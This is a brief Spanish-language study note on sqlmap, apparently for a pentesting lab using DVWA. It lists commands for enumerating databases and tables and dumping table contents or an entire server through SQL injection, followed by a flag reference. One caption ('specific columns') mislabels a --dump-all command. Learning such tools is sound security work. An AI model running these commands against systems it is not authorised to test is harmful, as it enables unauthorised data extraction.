
---
## ¿Qué es?

Es una herramienta automatizada utilizada para detectar y explotar vulnerabilidades de inyección **[[SQL]]**.

Permite enumerar bases de datos, manipular tablas, identificar si un parámetro es vulnerable, extraer datos, etc...

---
## Comandos de ejemplos

Descargar todo el contenido de una tabla:

```
sqlmap -r request.txt --batch -D dvwa -T users --dump
```

Descargar columnas específicas:

```
sqlmap -r request.txt --batch -D [bsase de datos objetivo] --dump-all
```

Vaciado total del servidor:

```
sqlmap -r request.txt --batch --dump-all
```

Averiguar nombres de bases de datos:

```
sqlmap -r request.txt --dbs
```

Averiguar los nombres de las tablas de una base de datos:

```
sqlmap -r request.txt --batch -D dvwa --tables
```

El archivo `request.txt` lo tendremos que crear nosotros, en el incluiremos la REQUEST que hace la aplicación al servidor. 

![[Pasted image 20260127230029.png]]

---
## Flags

- `-r` -> Carga la petición HTTP desde un archivo de texto.
- `-D` -> Define la base de datos objetivo.
- `-T` -> Define la tabla objetivo.
- `-C` -> Define las columnas específicas.
- `--dbs` -> Para enumerar las bases de datos.
- `--tables` -> Para enumerar las tablas.
- `--dump` -> Comando para descargar la información.